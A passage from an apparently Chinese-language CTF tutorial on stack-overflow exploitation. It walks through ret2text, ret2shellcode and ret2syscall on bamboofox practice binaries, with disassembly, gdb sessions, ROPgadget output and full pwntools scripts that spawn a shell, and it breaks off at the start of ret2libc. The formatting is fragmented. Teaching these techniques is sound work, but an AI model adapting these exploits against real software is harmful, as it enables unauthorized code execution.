\neax\n,\n \n[\nebp\n+\ninput\n]\n\n\n.text:\n08048622\n                 \nmov\n     \n[\nesp\n+\n4\n],\n \neax\n\n\n.text:\n08048626\n                 \nmov\n     \ndword\n \nptr\n \n[\nesp\n],\n \noffset\n \nunk_8048760\n\n\n.text:\n0804862\nD\n                 \ncall\n    \n___isoc99_scanf\n\n\n.text:\n08048632\n                 \nmov\n     \neax\n,\n \n[\nebp\n+\ninput\n]\n\n\n.text:\n08048635\n                 \ncmp\n     \neax\n,\n \n[\nebp\n+\nsecretcode\n]\n\n\n.text:\n08048638\n                 \njnz\n     \nshort\n \nlocret_8048646\n\n\n.text:\n0804863\nA\n                 \nmov\n     \ndword\n \nptr\n \n[\nesp\n],\n \noffset\n \ncommand\n \n; \n/bin/sh\n\n\n.text\n:\n08048641\n                 \ncall\n    \n_system\n\n\n\n\n\n\u5728secure\u51fd\u6570\u53c8\u53d1\u73b0\u4e86\u5b58\u5728\u8c03\u7528system(\"/bin/sh\")\u7684\u4ee3\u7801\uff0c\u90a3\u4e48\u5982\u679c\u6211\u4eec\u76f4\u63a5\u63a7\u5236\u7a0b\u5e8f\u8fd4\u56de\u81f30x0804863A\uff0c\u90a3\u4e48\u5c31\u53ef\u4ee5\u5f97\u5230\u7cfb\u7edf\u7684shell\u4e86\u3002\n\n\n\u4e0b\u9762\u5c31\u662f\u6211\u4eec\u5982\u4f55\u6784\u9020payload\u4e86\uff0c\u9996\u5148\u9700\u8981\u786e\u5b9a\u7684\u662f\u6211\u4eec\u80fd\u591f\u63a7\u5236\u7684\u5185\u5b58\u5730\u5740\u8ddd\u79bbmain\u51fd\u6570\u7684\u8fd4\u56de\u5730\u5740\u7684\u5b57\u8282\u6570\u3002\n\n\n.text:\n080486\nA7\n                 \nlea\n     \neax\n,\n \n[\nesp\n+\n1\nCh\n]\n\n\n.text:\n080486\nAB\n                 \nmov\n     \n[\nesp\n],\n \neax\n      \n; s\n\n\n.text\n:\n080486\nAE\n                 \ncall\n    \n_gets\n\n\n\n\n\n\u53ef\u4ee5\u770b\u5230\u8be5\u5b57\u7b26\u4e32\u662f\u901a\u8fc7\u76f8\u5bf9\u4e8eesp\u7684\u7d22\u5f15\uff0c\u6240\u4ee5\u6211\u4eec\u9700\u8981\u8fdb\u884c\u8c03\u8bd5\uff0c\u5c06\u65ad\u70b9\u4e0b\u5728call\u5904\uff0c\u67e5\u770besp\uff0cebp\uff0c\u5982\u4e0b\n\n\ngef\u27a4  b *0x080486AE\nBreakpoint \n1\n at 0x80486ae: file ret2text.c, line \n24\n.\ngef\u27a4  r\nThere is something amazing here, \ndo\n you know anything?\n\nBreakpoint \n1\n, 0x080486ae in main \n()\n at ret2text.c:24\n\n24\n      gets\n(\nbuf\n)\n;\n\n\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\n[\n registers \n]\n\u2500\u2500\u2500\u2500\n\n$eax\n   : 0xffffcd5c  \u2192  0x08048329  \u2192  \n__libc_start_main\n\n\n$ebx\n   : 0x00000000\n\n$ecx\n   : 0xffffffff\n\n$edx\n   : 0xf7faf870  \u2192  0x00000000\n\n$esp\n   : 0xffffcd40  \u2192  0xffffcd5c  \u2192  0x08048329  \u2192  \n__libc_start_main\n\n\n$ebp\n   : 0xffffcdc8  \u2192  0x00000000\n\n$esi\n   : 0xf7fae000  \u2192  0x001b1db0\n\n$edi\n   : 0xf7fae000  \u2192  0x001b1db0\n\n$eip\n   : 0x080486ae  \u2192  \nmain+102\n call 0x8048460 \ngets@plt\n\n\n\n\n\n\u53ef\u4ee5\u770b\u5230esp\u4e3a0xffffcd40\uff0cebp\u4e3a\u5177\u4f53\u7684payload\u5982\u4e0b0xffffcdc8\uff0c\u540c\u65f6s\u76f8\u5bf9\u4e8eesp\u7684\u7d22\u5f15\u4e3a[esp+0x1c]\uff0c\u6240\u4ee5\uff0cs\u7684\u5730\u5740\u4e3a0xffffcd5c\uff0c\u6240\u4ee5s\u76f8\u5bf9\u4e8eebp\u7684\u504f\u79fb\u4e3a0x6C\uff0c\u6240\u4ee5\u76f8\u5bf9\u4e8e\u8fd4\u56de\u5730\u5740\u7684\u504f\u79fb\u4e3a0x6c+4\u3002\n\n\n\u6700\u540e\u7684payload\u5982\u4e0b\uff1a\n\n\n##!/usr/bin/env python\n\n\nfrom\n \npwn\n \nimport\n \n*\n\n\n\nsh\n \n=\n \nprocess\n(\n./ret2text\n)\n\n\ntarget\n \n=\n \n0x804863a\n\n\nsh\n.\nsendline\n(\nA\n \n*\n \n(\n0x6c\n+\n4\n)\n \n+\n \np32\n(\ntarget\n))\n\n\nsh\n.\ninteractive\n()\n\n\n\n\n\n\u9898\u76ee\n\n\nret2shellcode\n\n\n\u539f\u7406\n\n\nret2shellcode\u9700\u8981\u6211\u4eec\u63a7\u5236\u7a0b\u5e8f\u6267\u884cshellcode\u4ee3\u7801\u3002\u800c\u6240\u8c13\u7684shellcode\u6307\u7684\u662f\u7528\u4e8e\u5b8c\u6210\u67d0\u4e2a\u529f\u80fd\u7684\u6c47\u7f16\u4ee3\u7801\uff0c\u5e38\u89c1\u7684\u529f\u80fd\u4e3b\u8981\u662f\u83b7\u53d6\u76ee\u6807\u7cfb\u7edf\u7684shell\u3002\n\u4e00\u822c\u6765\u8bf4\uff0cshellcode\u90fd\u9700\u8981\u6211\u4eec\u81ea\u5df1\u53bb\u586b\u5145\u3002\u8fd9\u5176\u5b9e\u662f\u53e6\u5916\u4e00\u79cd\u5178\u578b\u7684\u5229\u7528\u7684\u65b9\u6cd5\uff0c\u5373\u6b64\u65f6\u6211\u4eec\u9700\u8981\u81ea\u5df1\u53bb\u586b\u5145\u4e00\u4e9b\u53ef\u6267\u884c\u7684\u4ee3\u7801\n\u3002\n\n\n\u800c\u5728\u6808\u6ea2\u51fa\u7684\u57fa\u7840\u4e0a\uff0c\u6211\u4eec\u4e00\u822c\u90fd\u662f\u5411\u6808\u4e2d\u5199\u5185\u5bb9\uff0c\u6240\u4ee5\u8981\u60f3\u6267\u884cshellcode\uff0c\u9700\u8981\u5bf9\u5e94\u7684binary\u6587\u4ef6\u6ca1\u6709\u5f00\u542fNX\u4fdd\u62a4\u3002\n\n\n\u4f8b\u5b50\n\n\n\u8fd9\u91cc\u6211\u4eec\u4ee5bamboofox\u4e2d\u7684ret2shellcode\u4e3a\u4f8b  \n\n\n\u70b9\u51fb\u4e0b\u8f7d: \nret2shellcode\n\n\n\u9996\u5148\u68c0\u6d4b\u7a0b\u5e8f\u5f00\u542f\u7684\u4fdd\u62a4\n\n\n\u279c  ret2shellcode checksec ret2shellcode\n    Arch:     i386-32-little\n    RELRO:    Partial RELRO\n    Stack:    No canary found\n    NX:       NX disabled\n    PIE:      No PIE \n(\n0x8048000\n)\n\n    RWX:      Has RWX segments\n\n\n\n\n\u53ef\u4ee5\u770b\u51fa\u6e90\u7a0b\u5e8f\u51e0\u4e4e\u6ca1\u6709\u5f00\u542f\u4efb\u4f55\u4fdd\u62a4\uff0c\u5e76\u4e14\u6709\u53ef\u8bfb\uff0c\u53ef\u5199\uff0c\u53ef\u6267\u884c\u6bb5\u3002\u6211\u4eec\u518d\u4f7f\u7528IDA\u770b\u4e00\u4e0b\u7a0b\u5e8f\n\n\nint\n \n__cdecl\n \nmain\n(\nint\n \nargc\n,\n \nconst\n \nchar\n \n**\nargv\n,\n \nconst\n \nchar\n \n**\nenvp\n)\n\n\n{\n\n  \nint\n \nv4\n;\n \n// [sp+1Ch] [bp-64h]@1\n\n\n  \nsetvbuf\n(\nstdout\n,\n \n0\n,\n \n2\n,\n \n0\n);\n\n  \nsetvbuf\n(\nstdin\n,\n \n0\n,\n \n1\n,\n \n0\n);\n\n  \nputs\n(\nNo system for you this time !!!\n);\n\n  \ngets\n((\nchar\n \n*\n)\nv4\n);\n\n  \nstrncpy\n(\nbuf2\n,\n \n(\nconst\n \nchar\n \n*\n)\nv4\n,\n \n0x64u\n);\n\n  \nprintf\n(\nbye bye ~\n);\n\n  \nreturn\n \n0\n;\n\n\n}\n\n\n\n\n\n\u53ef\u4ee5\u770b\u51fa\uff0c\u7a0b\u5e8f\u4ecd\u7136\u662f\u57fa\u672c\u7684\u6808\u6ea2\u51fa\u6f0f\u6d1e\uff0c\u4e0d\u8fc7\u8fd9\u6b21\u8fd8\u540c\u65f6\u5c06\u5bf9\u5e94\u7684\u5b57\u7b26\u4e32\u590d\u5236\u5230buf2\u5904\u3002\u7b80\u5355\u67e5\u770b\u53ef\u77e5buf2\u5728bss\u6bb5\u3002\n\n\n.bss:\n0804\nA080\n                 \npublic\n \nbuf2\n\n\n.bss:\n0804\nA080\n \n; char buf2[100]\n\n\n\n\n\n\u8fd9\u65f6\uff0c\u6211\u4eec\u7b80\u5355\u7684\u8c03\u8bd5\u4e0b\u7a0b\u5e8f\uff0c\u770b\u770b\u8fd9\u4e00\u4e2abss\u6bb5\u662f\u5426\u53ef\u6267\u884c\u3002\n\n\ngef\u27a4  b main\nBreakpoint \n1\n at 0x8048536: file ret2shellcode.c, line \n8\n.\ngef\u27a4  r\nStarting program: /mnt/hgfs/Hack/CTF-Learn/pwn/stack/example/ret2shellcode/ret2shellcode \n\nBreakpoint \n1\n, main \n()\n at ret2shellcode.c:8\n\n8\n       setvbuf\n(\nstdout, 0LL, \n2\n, 0LL\n)\n;\n\n\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\n[\n source:ret2shellcode.c+8 \n]\n\u2500\u2500\u2500\u2500\n      \n6\n  int main\n(\nvoid\n)\n\n      \n7\n  \n{\n\n \u2192    \n8\n      setvbuf\n(\nstdout, 0LL, \n2\n, 0LL\n)\n;\n\n      \n9\n      setvbuf\n(\nstdin, 0LL, \n1\n, 0LL\n)\n;\n\n     \n10\n  \n\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\n[\n trace \n]\n\u2500\u2500\u2500\u2500\n\n[\n#0] 0x8048536 \u2192 Name: main()\n\n\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\ngef\u27a4  vmmap \nStart      End        Offset     Perm Path\n0x08048000 0x08049000 0x00000000 r-x /mnt/hgfs/Hack/CTF-Learn/pwn/stack/example/ret2shellcode/ret2shellcode\n0x08049000 0x0804a000 0x00000000 r-x /mnt/hgfs/Hack/CTF-Learn/pwn/stack/example/ret2shellcode/ret2shellcode\n0x0804a000 0x0804b000 0x00001000 rwx /mnt/hgfs/Hack/CTF-Learn/pwn/stack/example/ret2shellcode/ret2shellcode\n0xf7dfc000 0xf7fab000 0x00000000 r-x /lib/i386-linux-gnu/libc-2.23.so\n0xf7fab000 0xf7fac000 0x001af000 --- /lib/i386-linux-gnu/libc-2.23.so\n0xf7fac000 0xf7fae000 0x001af000 r-x /lib/i386-linux-gnu/libc-2.23.so\n0xf7fae000 0xf7faf000 0x001b1000 rwx /lib/i386-linux-gnu/libc-2.23.so\n0xf7faf000 0xf7fb2000 0x00000000 rwx \n0xf7fd3000 0xf7fd5000 0x00000000 rwx \n0xf7fd5000 0xf7fd7000 0x00000000 r-- \n[\nvvar\n]\n\n0xf7fd7000 0xf7fd9000 0x00000000 r-x \n[\nvdso\n]\n\n0xf7fd9000 0xf7ffb000 0x00000000 r-x /lib/i386-linux-gnu/ld-2.23.so\n0xf7ffb000 0xf7ffc000 0x00000000 rwx \n0xf7ffc000 0xf7ffd000 0x00022000 r-x /lib/i386-linux-gnu/ld-2.23.so\n0xf7ffd000 0xf7ffe000 0x00023000 rwx /lib/i386-linux-gnu/ld-2.23.so\n0xfffdd000 0xffffe000 0x00000000 rwx \n[\nstack\n]\n\n\n\n\n\n\u901a\u8fc7vmmap\uff0c\u6211\u4eec\u53ef\u4ee5\u770b\u5230bss\u6bb5\u5bf9\u5e94\u7684\u6bb5\u5177\u6709\u53ef\u6267\u884c\u6743\u9650\n\n\n0x0804a000 0x0804b000 0x00001000 rwx /mnt/hgfs/Hack/CTF-Learn/pwn/stack/example/ret2shellcode/ret2shellcode\n\n\n\n\n\u90a3\u4e48\u8fd9\u6b21\u6211\u4eec\u5c31\u63a7\u5236\u7a0b\u5e8f\u6267\u884cshellcode\uff0c\u4e5f\u5c31\u662f\u8bfb\u5165shellcode\uff0c\u7136\u540e\u63a7\u5236\u7a0b\u5e8f\u6267\u884cbss\u6bb5\u5904\u7684shellcode\u3002\u5176\u4e2d\uff0c\u76f8\u5e94\u7684\u504f\u79fb\u8ba1\u7b97\u7c7b\u4f3c\u4e8eret2text\u4e2d\u7684\u4f8b\u5b50\u3002\n\n\n\u5177\u4f53\u7684payload\u5982\u4e0b\n\n\n##!/usr/bin/env python\n\n\nfrom\n \npwn\n \nimport\n \n*\n\n\n\nsh\n \n=\n \nprocess\n(\n./ret2shellcode\n)\n\n\nshellcode\n \n=\n \nasm\n(\nshellcraft\n.\nsh\n())\n\n\nbuf2_addr\n \n=\n \n0x804a080\n\n\n\nsh\n.\nsendline\n(\nshellcode\n.\nljust\n(\n112\n,\n \nA\n)\n \n+\n \np32\n(\nbuf2_addr\n))\n\n\nsh\n.\ninteractive\n()\n\n\n\n\n\n\u9898\u76ee\n\n\n\n\nsniperoj-pwn100-shellcode-x86-64\n\n\n\n\nret2syscall\n\n\n\u539f\u7406\n\n\nret2syscall\u9700\u8981\u6211\u4eec\u63a7\u5236\u7a0b\u5e8f\u6267\u884c\u7cfb\u7edf\u8c03\u7528\uff0c\u83b7\u53d6shell\u3002\n\n\n\u4f8b\u5b50\n\n\n\u8fd9\u91cc\u6211\u4eec\u4ee5bamboofox\u4e2d\u7684ret2syscall\u4e3a\u4f8b  \n\n\n\u70b9\u51fb\u4e0b\u8f7d: \nret2syscall\n\n\n\u9996\u5148\u68c0\u6d4b\u7a0b\u5e8f\u5f00\u542f\u7684\u4fdd\u62a4\n\n\n\u279c  ret2syscall checksec rop\n    Arch:     i386-32-little\n    RELRO:    Partial RELRO\n    Stack:    No canary found\n    NX:       NX enabled\n    PIE:      No PIE \n(\n0x8048000\n)\n\n\n\n\n\n\u53ef\u4ee5\u770b\u51fa\uff0c\u6e90\u7a0b\u5e8f\u4e3a32\u4f4d\uff0c\u5f00\u542f\u4e86NX\u4fdd\u62a4\u3002\u63a5\u4e0b\u6765\u5229\u7528IDA\u6765\u67e5\u770b\u6e90\u7801\n\n\nint\n \n__cdecl\n \nmain\n(\nint\n \nargc\n,\n \nconst\n \nchar\n \n**\nargv\n,\n \nconst\n \nchar\n \n**\nenvp\n)\n\n\n{\n\n  \nint\n \nv4\n;\n \n// [sp+1Ch] [bp-64h]@1\n\n\n  \nsetvbuf\n(\nstdout\n,\n \n0\n,\n \n2\n,\n \n0\n);\n\n  \nsetvbuf\n(\nstdin\n,\n \n0\n,\n \n1\n,\n \n0\n);\n\n  \nputs\n(\nThis time, no system() and NO SHELLCODE!!!\n);\n\n  \nputs\n(\nWhat do you plan to do?\n);\n\n  \ngets\n(\nv4\n);\n\n  \nreturn\n \n0\n;\n\n\n}\n\n\n\n\n\n\u53ef\u4ee5\u770b\u51fa\u6b64\u6b21\u4ecd\u7136\u662f\u4e00\u4e2a\u6808\u6ea2\u51fa\u3002\u7c7b\u4f3c\u4e8e\u4e4b\u524d\u7684\u505a\u6cd5\uff0c\u6211\u4eec\u53ef\u4ee5\u83b7\u5f97v4\u76f8\u5bf9\u4e8eebp\u7684\u504f\u79fb\u4e3a108\u3002\u6240\u4ee5\u6211\u4eec\u9700\u8981\u8986\u76d6\u7684\u8fd4\u56de\u5730\u5740\u76f8\u5bf9\u4e8ev4\u7684\u504f\u79fb\u4e3a112\u3002\u6b64\u6b21\uff0c\u7531\u4e8e\u6211\u4eec\u4e0d\u80fd\u76f4\u63a5\u5229\u7528\u7a0b\u5e8f\u4e2d\u7684\u67d0\u4e00\u6bb5\u4ee3\u7801\u6216\u8005\u81ea\u5df1\u586b\u5199\u4ee3\u7801\u6765\u83b7\u5f97shell\uff0c\u6240\u4ee5\u6211\u4eec\u5229\u7528\u7a0b\u5e8f\u4e2d\u7684gadgets\u6765\u83b7\u5f97shell\uff0c\u800c\u5bf9\u5e94\u7684shell\u83b7\u53d6\u5219\u662f\u5229\u7528\u7cfb\u7edf\u8c03\u7528\u3002\u5173\u4e8e\u7cfb\u7edf\u8c03\u7528\u7684\u77e5\u8bc6\uff0c\u8bf7\u53c2\u8003\n\n\n\n\nhttps://zh.wikipedia.org/wiki/%E7%B3%BB%E7%BB%9F%E8%B0%83%E7%94%A8\n\n\n\n\n\u7b80\u5355\u5730\u8bf4\uff0c\u53ea\u8981\u6211\u4eec\u628a\u5bf9\u5e94\u83b7\u53d6shell\u7684\u7cfb\u7edf\u8c03\u7528\u7684\u53c2\u6570\u653e\u5230\u5bf9\u5e94\u7684\u5bc4\u5b58\u5668\u4e2d\uff0c\u90a3\u4e48\u6211\u4eec\u5728\u6267\u884cint 0x80\u5c31\u53ef\u6267\u884c\u5bf9\u5e94\u7684\u7cfb\u7edf\u8c03\u7528\u3002\u6bd4\u5982\u8bf4\u8fd9\u91cc\u6211\u4eec\u5229\u7528\u5982\u4e0b\u7cfb\u7edf\u8c03\u7528\u6765\u83b7\u53d6shell\n\n\nexecve\n(\n/bin/sh\n,\nNULL\n,\nNULL\n)\n\n\n\n\n\n\u5176\u4e2d\uff0c\u8be5\u7a0b\u5e8f\u662f32\u4f4d\uff0c\u6240\u4ee5\u6211\u4eec\u9700\u8981\u4f7f\u5f97\n\n\n\n\n\u7cfb\u7edf\u8c03\u7528\u53f7\u5373eax\u5e94\u8be5\u4e3a0xb\n\n\n\u7b2c\u4e00\u4e2a\u53c2\u6570\u5373ebx\u5e94\u8be5\u6307\u5411/bin/sh\u7684\u5730\u5740\uff0c\u5176\u5b9e\u6267\u884csh\u7684\u5730\u5740\u4e5f\u53ef\u4ee5\n\n\n\u7b2c\u4e8c\u4e2a\u53c2\u6570\u5373ecx\u5e94\u8be5\u4e3a0\n\n\n\u7b2c\u4e09\u4e2a\u53c2\u6570edx\u5e94\u8be5\u4e3a0\n\n\n\n\n\u800c\u6211\u4eec\u5982\u4f55\u63a7\u5236\u8fd9\u4e9b\u5bc4\u5b58\u5668\u7684\u503c \u5462\uff1f\u8fd9\u91cc\u5c31\u9700\u8981\u4f7f\u7528gadgets\u3002\u6bd4\u5982\u8bf4\uff0c\u73b0\u5728\u6808\u9876\u662f10\uff0c\u90a3\u4e48\u5982\u679c\u6b64\u65f6\u6267\u884c\u4e86pop eax\uff0c\u90a3\u4e48\u73b0\u5728eax\u7684\u503c\u5c31\u4e3a10\u3002\u4f46\u662f\u6211\u4eec\u5e76\u4e0d\u80fd\u671f\u5f85\u6709\u4e00\u6bb5\u8fde\u7eed\u7684\u4ee3\u7801\u53ef\u4ee5\u540c\u65f6\u63a7\u5236\u5bf9\u5e94\u7684\u5bc4\u5b58\u5668\uff0c\u6240\u4ee5\u6211\u4eec\u9700\u8981\u4e00\u6bb5\u4e00\u6bb5\u63a7\u5236\uff0c\u8fd9\u4e5f\u662f\u6211\u4eec\u5728gadgets\u6700\u540e\u4f7f\u7528ret\u6765\u518d\u6b21\u63a7\u5236\u7a0b\u5e8f\u6267\u884c\u6d41\u7a0b\u7684\u539f\u56e0\u3002\u5177\u4f53\u5bfb\u627egadgets\u7684\u65b9\u6cd5\uff0c\u6211\u4eec\u53ef\u4ee5\u4f7f\u7528ropgadgets\u8fd9\u4e2a\u5de5\u5177\u3002\n\n\n\u9996\u5148\uff0c\u6211\u4eec\u6765\u5bfb\u627e\u63a7\u5236eax\u7684gadgets\n\n\n\u279c  ret2syscall ROPgadget --binary rop  --only \npop|ret\n \n|\n grep \neax\n\n0x0809ddda : pop eax \n;\n pop ebx \n;\n pop esi \n;\n pop edi \n;\n ret\n0x080bb196 : pop eax \n;\n ret\n0x0807217a : pop eax \n;\n ret 0x80e\n0x0804f704 : pop eax \n;\n ret \n3\n\n0x0809ddd9 : pop es \n;\n pop eax \n;\n pop ebx \n;\n pop esi \n;\n pop edi \n;\n ret\n\n\n\n\n\u53ef\u4ee5\u770b\u5230\u6709\u4e0a\u8ff0\u51e0\u4e2a\u90fd\u53ef\u4ee5\u63a7\u5236eax\uff0c\u90a3\u6211\u5c31\u9009\u53d6\u7b2c\u4e8c\u4e2a\u6765\u4f5c\u4e3a\u6211\u7684gadgets\u3002\n\n\n\u7c7b\u4f3c\u7684\uff0c\u6211\u4eec\u53ef\u4ee5\u5f97\u5230\u63a7\u5236\u5176\u5b83\u5bc4\u5b58\u5668\u7684gadgets\n\n\n\u279c  ret2syscall ROPgadget --binary rop  --only \npop|ret\n \n|\n grep \nebx\n\n0x0809dde2 : pop ds \n;\n pop ebx \n;\n pop esi \n;\n pop edi \n;\n ret\n0x0809ddda : pop eax \n;\n pop ebx \n;\n pop esi \n;\n pop edi \n;\n ret\n0x0805b6ed : pop ebp \n;\n pop ebx \n;\n pop esi \n;\n pop edi \n;\n ret\n0x0809e1d4 : pop ebx \n;\n pop ebp \n;\n pop esi \n;\n pop edi \n;\n ret\n0x080be23f : pop ebx \n;\n pop edi \n;\n ret\n0x0806eb69 : pop ebx \n;\n pop edx \n;\n ret\n0x08092258 : pop ebx \n;\n pop esi \n;\n pop ebp \n;\n ret\n0x0804838b : pop ebx \n;\n pop esi \n;\n pop edi \n;\n pop ebp \n;\n ret\n0x080a9a42 : pop ebx \n;\n pop esi \n;\n pop edi \n;\n pop ebp \n;\n ret 0x10\n0x08096a26 : pop ebx \n;\n pop esi \n;\n pop edi \n;\n pop ebp \n;\n ret 0x14\n0x08070d73 : pop ebx \n;\n pop esi \n;\n pop edi \n;\n pop ebp \n;\n ret 0xc\n0x0805ae81 : pop ebx \n;\n pop esi \n;\n pop edi \n;\n pop ebp \n;\n ret \n4\n\n0x08049bfd : pop ebx \n;\n pop esi \n;\n pop edi \n;\n pop ebp \n;\n ret \n8\n\n0x08048913 : pop ebx \n;\n pop esi \n;\n pop edi \n;\n ret\n0x08049a19 : pop ebx \n;\n pop esi \n;\n pop edi \n;\n ret \n4\n\n0x08049a94 : pop ebx \n;\n pop esi \n;\n ret\n0x080481c9 : pop ebx \n;\n ret\n0x080d7d3c : pop ebx \n;\n ret 0x6f9\n0x08099c87 : pop ebx \n;\n ret \n8\n\n0x0806eb91 : pop ecx \n;\n pop ebx \n;\n ret\n0x0806336b : pop edi \n;\n pop esi \n;\n pop ebx \n;\n ret\n0x0806eb90 : pop edx \n;\n pop ecx \n;\n pop ebx \n;\n ret\n0x0809ddd9 : pop es \n;\n pop eax \n;\n pop ebx \n;\n pop esi \n;\n pop edi \n;\n ret\n0x0806eb68 : pop esi \n;\n pop ebx \n;\n pop edx \n;\n ret\n0x0805c820 : pop esi \n;\n pop ebx \n;\n ret\n0x08050256 : pop esp \n;\n pop ebx \n;\n pop esi \n;\n pop edi \n;\n pop ebp \n;\n ret\n0x0807b6ed : pop ss \n;\n pop ebx \n;\n ret\n\n\n\n\n\u8fd9\u91cc\uff0c\u6211\u9009\u62e9\n\n\n0x0806eb90 : pop edx ; pop ecx ; pop ebx ; ret\n\n\n\n\n\u8fd9\u4e2a\u53ef\u4ee5\u76f4\u63a5\u63a7\u5236\u5176\u5b83\u4e09\u4e2a\u5bc4\u5b58\u5668\u3002\n\n\n\u6b64\u5916\uff0c\u6211\u4eec\u9700\u8981\u83b7\u5f97/bin/sh\u5b57\u7b26\u4e32\u5bf9\u5e94\u7684\u5730\u5740\u3002\n\n\n\u279c  ret2syscall ROPgadget --binary rop  --string \n/bin/sh\n \nStrings \ninformation\n\n\n============================================================\n\n0x080be408 : /bin/sh\n\n\n\n\n\u53ef\u4ee5\u627e\u5230\u5bf9\u5e94\u7684\u5730\u5740\uff0c\u6b64\u5916\uff0c\u8fd8\u6709int 0x80\u7684\u5730\u5740\uff0c\u5982\u4e0b\n\n\n\u279c  ret2syscall ROPgadget --binary rop  --only \nint\n                 \nGadgets information\n============================================================\n0x08049421 : int 0x80\n0x080938fe : int 0xbb\n0x080869b5 : int 0xf6\n0x0807b4d4 : int 0xfc\n\nUnique gadgets found: 4\n\n\n\n\n\u540c\u65f6\uff0c\u4e5f\u627e\u5230\u5bf9\u5e94\u7684\u5730\u5740\u4e86\u3002\n\n\n\u4e0b\u9762\u5c31\u662f\u5bf9\u5e94\u7684payload,\u5176\u4e2d0xb\u4e3aexecve\u5bf9\u5e94\u7684\u7cfb\u7edf\u8c03\u7528\u53f7\u3002\n\n\n##!/usr/bin/env python\n\n\nfrom\n \npwn\n \nimport\n \n*\n\n\n\nsh\n \n=\n \nprocess\n(\n./rop\n)\n\n\n\npop_eax_ret\n \n=\n \n0x080bb196\n\n\npop_edx_ecx_ebx_ret\n \n=\n \n0x0806eb90\n\n\nint_0x80\n \n=\n \n0x08049421\n\n\nbinsh\n \n=\n \n0x80be408\n\n\npayload\n \n=\n \nflat\n(\n\n    \n[\nA\n \n*\n \n112\n,\n \npop_eax_ret\n,\n \n0xb\n,\n \npop_edx_ecx_ebx_ret\n,\n \n0\n,\n \n0\n,\n \nbinsh\n,\n \nint_0x80\n])\n\n\nsh\n.\nsendline\n(\npayload\n)\n\n\nsh\n.\ninteractive\n()\n\n\n\n\n\n\u9898\u76ee\n\n\nret2libc\n\n\n\u539f\u7406\n\n\nret2libc\u5373\u63a7\u5236\u51fd\u6570\u7684\u6267\u884c libc\u4e2d\u7684\u51fd\u6570\uff0c\u901a\u5e38\u662f\u8fd4\u56de\u81f3\u67d0\u4e2a\u51fd\u6570\u7684plt\u5904\u6216\u8005\u51fd\u6570\u7684\u5177\u4f53\u4f4d\u7f6e(\u5373\u51fd\u6570\u5bf9\u5e94\u7684got\u8868\u9879\u7684\u5185\u5bb9)\u3002\u4e00\u822c\u60c5\u51b5\u4e0b\uff0c\u6211\u4eec\u4f1a\u9009\u62e9\u6267\u884csystem(\"/bin/sh\")\uff0c\u6545\u800c\u6b64\u65f6\u6211\u4eec\u9700\u8981\u77e5\u9053system\u51fd\u6570\u7684\u5730\u5740\u3002\n\n\n\u4f8b\u5b50\n\n\n\u6211\u4eec\u7531\u7b80\u5355\u5230\u96be\u5206\u522b\u7ed9\u51fa\u4e09\u4e2a\u4f8b\u5b50\u3002\n\n\n\u4f8b1\n\n\n\u8fd9\u91cc\u6211\u4eec\u4ee5bamboofox\u4e2dret2libc1\u4e3a\u4f8b  \n\n\n\u70b9\u51fb\u4e0b\u8f7d: \nret2libc1\n\n\n\u9996\u5148\uff0c\u6211\u4eec\u53ef\u4ee5\u68c0\u67e5\u4e00\u4e0b\u7a0b\u5e8f\u7684\u5b89\u5168\u4fdd\u62a4\n\n\n\u279c  ret2libc1 checksec ret2libc1    \n    Arch:     i386-32-little\n    RELRO:    Partial RELRO\n    Stack:    No canary found\n    NX:       NX enabled\n    PIE:      No PIE \n(\n0x8048000\n)\n\n\n\n\n\n\u6e90\u7a0b\u5e8f\u4e3a32\u4f4d\uff0c\u5f00\u542f\u4e86NX\u4fdd\u62a4\u3002\u4e0b\u9762\u6765\u770b\u4e00\u4e0b\u7a0b\u5e8f\u6e90\u4ee3\u7801\uff0c\u786e\u5b9a\u6f0f\u6d1e\u4f4d\u7f6e\n\n\nint\n \n__cdecl\n \nmain\n(\nint\n \nargc\n,\n \nconst\n \nchar\n \n**\nargv\n,\n \nconst\n \nchar\n \n**\nenvp\n)\n\n\n{\n\n  \nint\n \nv4\n;\n \n// [sp+1Ch] [bp-64h]@1\n\n\n  \nsetvbuf\n(\nstdout\n,\n \n0\n,\n \n2\n,\n \n0\n);\n\n  \nsetvbuf\n(\n_bss_start\n,\n \n0\n,\n \n1\n,\n 